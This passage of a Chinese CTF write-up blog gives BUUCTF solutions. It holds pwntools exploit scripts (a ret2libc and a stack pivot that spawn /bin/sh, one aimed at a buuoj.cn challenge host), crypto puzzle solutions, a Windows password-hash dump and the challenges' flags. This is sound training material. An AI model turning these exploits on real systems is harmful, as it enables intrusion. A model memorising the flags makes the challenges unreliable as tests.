<span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">__libc_start_main = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vulnerable_function = elf.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Debug(p, &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># b *0x08048483</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line">ru(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x88</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(__libc_start_main) + p32(<span class="number">4</span>) + p32(vulnerable_function)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">__libc_start_main_addr = u32(rv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">lib = ELF(<span class="string">&quot;./libc-2.23_32.so&quot;</span>)</span><br><span class="line">lib.address = __libc_start_main_addr - lib.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;lib.address =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(lib.address)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;lib.address =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(lib.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">str_bin_sh = <span class="built_in">next</span>(lib.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&quot;A&quot;</span> * <span class="number">0x88</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(str_bin_sh)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">   RELRO:    Partial RELRO</span><br><span class="line">   Stack:    No canary found</span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><strong>vul():</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u); <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">48u</span>); <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在栈溢出，但溢出大小有限，只能溢出4个字节，但刚好可以覆盖到<code>esp</code>和<code>return address</code></p><p><strong>hack():</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在system函数，<code>echo flag</code>是真的只输出<code>flag</code>这四个字符</p><p>综上考虑，考虑迁栈，即返回到<code>system</code>时，栈上数据为传入参数<code>/bin/sh</code></p><p>那么我们首先要把栈地址弄出来，题目正好有两个输入两个输出</p><h4 id="EXP-22"><a href="#EXP-22" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:28710&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * (<span class="number">40</span> - <span class="number">4</span>) + <span class="string">b&quot;BBBB&quot;</span></span><br><span class="line">ru(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">ru(<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">esp = u32(rv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;esp: %x&quot;</span> % esp)</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret_addr = <span class="number">0x080485FD</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(system_plt)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(esp - <span class="number">0x38</span>+<span class="number">0x10</span>) + <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(esp - <span class="number">0x38</span>)</span><br><span class="line">payload += p32(leave_ret_addr)</span><br><span class="line">sd(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a> 直接查得<code>admin1</code></p><p>则flag为<code>flag&#123;admin1&#125;</code></p><h3 id="Url编码"><a href="#Url编码" class="headerlink" title="Url编码"></a>Url编码</h3><p><a target="_blank" rel="noopener" href="https://tool.oschina.net/encode?type=4">https://tool.oschina.net/encode?type=4</a> 解得 <code>flag&#123;and 1=1&#125;</code></p><h3 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h3><p>base64 解得 <code>flag&#123;THE_FLAG_OF_THIS_STRING&#125;</code></p><h3 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h3><p>简单的移位密码, ROT13, 解得flag <code>flag&#123;5cd1004d-86a5-46d8-b720-beb5ba0417e1&#125;</code></p><h3 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h3><p>观察知前四位分别与<code>flag</code>相差5,6,7,8</p><p>则有</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">b&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">s = <span class="built_in">bytearray</span>(s)</span><br><span class="line">j = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">  s[i] += j</span><br><span class="line">  j += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>得flag<code>flag&#123;Caesar_variation&#125;</code></p><h3 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h3><p><a target="_blank" rel="noopener" href="http://web.chacuo.net/charsetquotedprintable">http://web.chacuo.net/charsetquotedprintable</a> 得<code>flag&#123;那你也很棒哦&#125;</code></p><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><p>UTF-8 编码, 脑洞猜flag: <code>flag&#123;zs19900315&#125;</code></p><h3 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">n = p * q</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p>得flag <code>flag&#123;5577446633554466577768879988&#125;</code></p><h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h3><p>用Rabbit解密得flag<code>flag&#123;Cute_Rabbit&#125;</code></p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><p>得flag: <code>flag&#123;125631357777427553&#125;</code></p><h3 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</span><br></pre></td></tr></table></figure><p>linux的passwd文件，用<a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a>解密得<code>good-luck</code>, 则flag: <code>flag&#123;good-luck&#125;</code></p><h3 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h3><p><a target="_blank" rel="noopener" href="http://factordb.com/index.php?query=98554799767">http://factordb.com/index.php?query=98554799767</a> 查得两个素数为<code>101999</code>和<code>966233</code>, 则</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s = <span class="string">&quot;101999&quot;</span> + <span class="string">&quot;966233&quot;</span></span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(s).hexdigest())</span><br></pre></td></tr></table></figure><p>得flag: <code>flag&#123;d450209323a847c8d01c6be47c81811a&#125;</code></p><h3 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h3><p>栅栏密码, 加密向量为2, 得到flag<code>flag&#123;wethinkwehavetheflag&#125;</code></p><h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</span><br></pre></td></tr></table></figure><p>秀上天际， 生僻字谐音, flag为<code>BJD&#123;淛匶襫黼瀬鎶軄鶛驕鳓哵&#125;</code></p><h3 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h3><p>凯撒密码, <code>FRPHEVGL</code>通过加密向量<code>13</code>解出<code>SECURITY</code></p><p>则flag为<code>flag&#123;PbzrPuvan&#125;</code></p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者:</span> <span class="post-copyright-info"><a href="http://lantern.cool">Lantern</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接:</span> <span class="post-copyright-info"><a href="http://lantern.cool/wp-games-buuctf/">http://lantern.cool/wp-games-buuctf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明:</span> <span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://lantern.cool" target="_blank">Lantern's 小站</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Write-up/">Write up</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/note-language-java-note/" title="Java 笔记"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files@latest/img/pexels-greg-contreras-3177804.jpg" onerror='onerror=null,src="/img/404.jpg"' alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Java 笔记</div></div></a></div><div class="next-post pull-right"><a href="/note-binary-const/" title="Const"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files@latest/img/pexels-nick-rtr-3129443.jpg" onerror='onerror=null,src="/img/404.jpg"' alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Const</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/wp-games-2018rctf/" title="2018 RCTF"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-05</div><div class="title">2018 RCTF</div></div></a></div><div><a href="/wp-games-2018wd/" title="2018 网鼎杯"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-06</div><div class="title">2018 网鼎杯</div></div></a></div><div><a href="/wp-games-2019aurora/" title="2019 Aurora"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-04</div><div class="title">2019 Aurora</div></div></a></div><div><a href="/wp-games-2019qwb/" title="2019 强网杯"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-04</div><div class="title">2019 强网杯</div></div></a></div><div><a href="/wp-games-2019rctf/" title="2019 RCTF"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-05</div><div class="title">2019 RCTF</div></div></a></div><div><a href="/wp-games-2019redhat/" title="2019 红帽杯"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/write_up.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-05-05</div><div class="title">2019 红帽杯</div></div></a></div></div></div><hr><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/lantern.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info__name">Lantern</div><div class="author-info__description">一位二进制萌新</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">86</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Lantern-r"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lantern-r" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:l2674318405@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Never Give Up</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">2.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easyre"><span class="toc-number">2.1.</span> <span class="toc-text">easyre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#helloword"><span class="toc-number">2.2.</span> <span class="toc-text">helloword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse1"><span class="toc-number">2.3.</span> <span class="toc-text">reverse1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse2"><span class="toc-number">2.4.</span> <span class="toc-text">reverse2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96"><span class="toc-number">2.5.</span> <span class="toc-text">刮开有奖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rsa"><span class="toc-number">2.6.</span> <span class="toc-text">rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CrackRTF"><span class="toc-number">2.7.</span> <span class="toc-text">CrackRTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1"><span class="toc-number">2.7.1.</span> <span class="toc-text">第一次</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1"><span class="toc-number">2.7.2.</span> <span class="toc-text">第二次</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crackMe"><span class="toc-number">2.8.</span> <span class="toc-text">crackMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#findit"><span class="toc-number">2.9.</span> <span class="toc-text">findit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90"><span class="toc-number">2.10.</span> <span class="toc-text">新年快乐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%B6%B5%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="toc-number">2.11.</span> <span class="toc-text">内涵的软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xor"><span class="toc-number">2.12.</span> <span class="toc-text">xor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse3"><span class="toc-number">2.13.</span> <span class="toc-text">reverse3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleRev"><span class="toc-number">2.14.</span> <span class="toc-text">SimpleRev</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag"><span class="toc-number">2.15.</span> <span class="toc-text">不一样的flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%86"><span class="toc-number">2.16.</span> <span class="toc-text">Java逆向解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E6%9C%BA"><span class="toc-number">2.17.</span> <span class="toc-text">简单注册机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-luck-guy"><span class="toc-number">2.18.</span> <span class="toc-text">[GXYCTF2019]luck_guy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt"><span class="toc-number">2.19.</span> <span class="toc-text">[ACTF新生赛2020]usualCrypt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-level1"><span class="toc-number">2.20.</span> <span class="toc-text">[WUSTCTF2020]level1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-Transform"><span class="toc-number">2.21.</span> <span class="toc-text">[MRCTF2020]Transform</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%86%8C"><span class="toc-number">2.22.</span> <span class="toc-text">相册</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-level2"><span class="toc-number">2.23.</span> <span class="toc-text">[WUSTCTF2020]level2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HDCTF2019-Maze"><span class="toc-number">2.24.</span> <span class="toc-text">[HDCTF2019]Maze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GWCTF-2019-xxor"><span class="toc-number">2.25.</span> <span class="toc-text">[GWCTF 2019]xxor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-Xor"><span class="toc-number">2.26.</span> <span class="toc-text">[MRCTF2020]Xor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn4-IgniteMe"><span class="toc-number">2.27.</span> <span class="toc-text">[FlareOn4]IgniteMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MRCTF2020-hello-world-go"><span class="toc-number">2.28.</span> <span class="toc-text">[MRCTF2020]hello_world_go</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-level3"><span class="toc-number">2.29.</span> <span class="toc-text">[WUSTCTF2020]level3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-Cr0ssfun"><span class="toc-number">2.30.</span> <span class="toc-text">[WUSTCTF2020]Cr0ssfun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-BJD-hamburger-competition"><span class="toc-number">2.31.</span> <span class="toc-text">[BJDCTF2020]BJD hamburger competition</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn6-Overlong"><span class="toc-number">2.32.</span> <span class="toc-text">[FlareOn6]Overlong</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga"><span class="toc-number">2.33.</span> <span class="toc-text">[ACTF新生赛2020]Oruga</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlareOn3-Challenge1"><span class="toc-number">2.34.</span> <span class="toc-text">[FlareOn3]Challenge1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UTCTF2020-basic-re"><span class="toc-number">2.35.</span> <span class="toc-text">[UTCTF2020]basic-re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Zer0pts2020-easy-strcmp"><span class="toc-number">2.36.</span> <span class="toc-text">[Zer0pts2020]easy strcmp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Universe-final-answer"><span class="toc-number">2.37.</span> <span class="toc-text">[ACTF新生赛2020]Universe_final_answer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#firmware"><span class="toc-number">2.38.</span> <span class="toc-text">firmware</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WUSTCTF2020-level4"><span class="toc-number">2.39.</span> <span class="toc-text">[WUSTCTF2020]level4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-singal"><span class="toc-number">2.40.</span> <span class="toc-text">[网鼎杯 2020 青龙组]singal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GUET-CTF2019-number-game"><span class="toc-number">2.41.</span> <span class="toc-text">[GUET-CTF2019]number_game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-simple-CPP"><span class="toc-number">2.42.</span> <span class="toc-text">[GXYCTF2019]simple CPP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="toc-number">2.42.1.</span> <span class="toc-text">第一部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86"><span class="toc-number">2.42.2.</span> <span class="toc-text">第二部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86"><span class="toc-number">2.42.3.</span> <span class="toc-text">第三部分</span></a></li><li class="toc-item toc-level-4"><a 